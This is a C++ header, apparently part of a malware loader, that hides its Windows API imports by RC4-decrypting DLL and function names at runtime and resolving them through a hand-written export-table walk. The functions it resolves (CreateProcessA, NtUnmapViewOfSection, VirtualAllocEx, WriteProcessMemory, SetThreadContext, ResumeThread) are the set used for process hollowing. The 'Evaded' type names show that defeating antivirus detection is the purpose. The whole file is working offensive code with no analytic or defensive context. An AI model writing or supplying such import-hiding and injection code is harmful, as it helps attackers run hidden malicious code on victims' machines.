#pragma once
#include <Windows.h>
#include <winnt.h>
#include <winternl.h>
#include "rc4Algorithm.h"

namespace hiddenImp {

    typedef FARPROC(WINAPI* EvadedGetProcAddress)(HMODULE, LPCSTR);
    typedef HMODULE(WINAPI* EvadedGetModuleHandleA)(LPCSTR);

  
    typedef HANDLE(WINAPI* EvadedCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);

    typedef LPVOID(WINAPI* EvadedVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);

    typedef BOOL(WINAPI* EvadedReadProcessMemory)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);

    typedef BOOL(WINAPI* EvadedWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);

    typedef BOOL(WINAPI* EvadedVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);

    typedef BOOL(WINAPI* EvadedGetThreadContext)(HANDLE, LPCONTEXT);

    typedef BOOL(WINAPI* EvadedSetThreadContext)(HANDLE, const CONTEXT*);

    typedef DWORD(WINAPI* EvadedResumeThread)(HANDLE);

    typedef LONG(WINAPI* EvadedNtUnmapViewOfSection)(HANDLE, PVOID);


    EvadedGetProcAddress EvGetProcAddress;
    EvadedGetModuleHandleA EvGetModuleHandleA;
    EvadedCreateProcessA EvCreateProcessA;
    EvadedGetThreadContext EvGetThreadContext;
    EvadedVirtualAllocEx EvVirtualAllocEx;
    EvadedReadProcessMemory EvReadProcessMemory;
    EvadedWriteProcessMemory EvWriteProcessMemory;
    EvadedVirtualProtectEx EvVirtualProtectEx;
    EvadedSetThreadContext EvSetThreadContext;
    EvadedResumeThread EvResumeThread;
    EvadedNtUnmapViewOfSection EvNtUnmapViewOfSection;

    DWORD FindFuncExportFromDLL(LPCSTR lpDllName, LPCSTR lpFunctionName) {
        HMODULE hModule;
        PDWORD pdwAddress, pdwName;
        PWORD pwOrdinal;

        hModule = GetModuleHandleA(lpDllName);

        if (!hModule)
            hModule = LoadLibraryA(lpDllName);
        if (!hModule)
            return NULL;

        PIMAGE_DOS_HEADER DOSHeader = (PIMAGE_DOS_HEADER)(DWORD)hModule;
        PIMAGE_NT_HEADERS NTHeaders = (PIMAGE_NT_HEADERS)((DWORD)hModule + DOSHeader->e_lfanew);


        if (NTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0)
            return NULL;

        auto pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)hModule + NTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
        pdwAddress = (PDWORD)((LPBYTE)hModule + pExportDirectory->AddressOfFunctions);
        pdwName = (PDWORD)((LPBYTE)hModule + pExportDirectory->AddressOfNames);

        pwOrdinal = (PWORD)((LPBYTE)hModule + pExportDirectory->AddressOfNameOrdinals);

        for (DWORD i = 0; i < pExportDirectory->AddressOfFunctions; i++) {
            if (!strcmp(lpFunctionName, (char*)hModule + pdwName[i])) {
                return (DWORD)((LPBYTE)hModule + pdwAddress[pwOrdinal[i]]);
            }
        }
        return NULL;
    }

    void ResolveImports() {

        rc4Algorithm rc4;
        const char* key = "Resolve";
        
        char* capsKernelDLL = rc4.crypt((char*)"\xA9\x76\x45\x0E\xEC\x22\x0F\xC8\x42\xAE\x5C\xA0", key, strlen(key), 12); //KERNEL32.DLL
        char* kernelDLL = rc4.crypt((char*)"\x89\x56\x65\x2E\xCC\x02\x0F\xC8\x42\x8E\x7C\x80", key, strlen(key), 12); //kernel32.dll
        char* ntDLL = rc4.crypt((char*)"\x8C\x47\x73\x2C\xC5\x40\x58\x96\x00", key, strlen(key), 9); //ntdll.dll

        
        EvGetProcAddress = (EvadedGetProcAddress)FindFuncExportFromDLL(capsKernelDLL, (LPCSTR)rc4.crypt((char*)"\xA5\x56\x63\x10\xDB\x01\x5F\xBB\x08\x8E\x62\x89\xBA\xF4", key, strlen(key), 14));
        EvGetModuleHandleA = (EvadedGetModuleHandleA)FindFuncExportFromDLL(capsKernelDLL, (LPCSTR)rc4.crypt((char*)"\xA5\x56\x63\x0D\xC6\x0A\x49\x96\x09\xA2\x71\x82\xAD\xEB\xA1\x09", key, strlen(key), 16));


        EvCreateProcessA = (EvadedCreateProcessA)EvGetProcAddress(EvGetModuleHandleA(kernelDLL), (LPCSTR)rc4.crypt((char*)"\xA1\x41\x72\x21\xDD\x0B\x6C\x88\x03\x89\x75\x9F\xBA\xC6", key, strlen(key), 14));
        EvGetThreadContext = (EvadedGetThreadContext)EvGetProcAddress(EvGetModuleHandleA(kernelDLL), (LPCSTR)rc4.crypt((char*)"\xA5\x56\x63\x14\xC1\x1C\x59\x9B\x08\xA9\x7F\x82\xBD\xE2\xBC\x3C", key, strlen(key), 16));
        EvVirtualAllocEx = (EvadedVirtualAllocEx)EvGetProcAddress(EvGetModuleHandleA(kernelDLL), (LPCSTR)rc4.crypt((char*)"\xB4\x5A\x65\x34\xDC\x0F\x50\xBB\x00\x86\x7F\x8F\x8C\xFF", key, strlen(key), 14));
        EvReadProcessMemory = (EvadedReadProcessMemory)EvGetProcAddress(EvGetModuleHandleA(kernelDLL), (LPCSTR)rc4.crypt((char*)"\xB0\x56\x76\x24\xF9\x1C\x53\x99\x09\x99\x63\xA1\xAC\xEA\xAB\x3A\xF8", key, strlen(key), 17));
        EvWriteProcessMemory = (EvadedWriteProcessMemory)EvGetProcAddress(EvGetModuleHandleA(kernelDLL), (LPCSTR)rc4.crypt((char*)"\xB5\x41\x7E\x34\xCC\x3E\x4E\x95\x0F\x8F\x63\x9F\x84\xE2\xA9\x27\xF3\x62", key, strlen(key), 18));
        EvVirtualProtectEx = (EvadedVirtualProtectEx)EvGetProcAddress(EvGetModuleHandleA(kernelDLL), (LPCSTR)rc4.crypt((char*)"\xB4\x5A\x65\x34\xDC\x0F\x50\xAA\x1E\x85\x64\x89\xAA\xF3\x81\x30", key, strlen(key), 16));
        EvSetThreadContext = (EvadedSetThreadContext)EvGetProcAddress(EvGetModuleHandleA(kernelDLL), (LPCSTR)rc4.crypt((char*)"\xB1\x56\x63\x14\xC1\x1C\x59\x9B\x08\xA9\x7F\x82\xBD\xE2\xBC\x3C", key, strlen(key), 16));
        EvResumeThread = (EvadedResumeThread)EvGetProcAddress(EvGetModuleHandleA(kernelDLL), (LPCSTR)rc4.crypt((char*)"\xB0\x56\x64\x35\xC4\x0B\x68\x92\x1E\x8F\x71\x88", key, strlen(key), 12));
        EvNtUnmapViewOfSection = (EvadedNtUnmapViewOfSection)EvGetProcAddress(EvGetModuleHandleA(ntDLL), (LPCSTR)rc4.crypt((char*)"\xAC\x47\x42\x2E\xC4\x0F\x4C\xAC\x05\x8F\x67\xA3\xAF\xD4\xA1\x2B\xF5\x72\x3F\xDF", key, strlen(key), 20));

    }
}




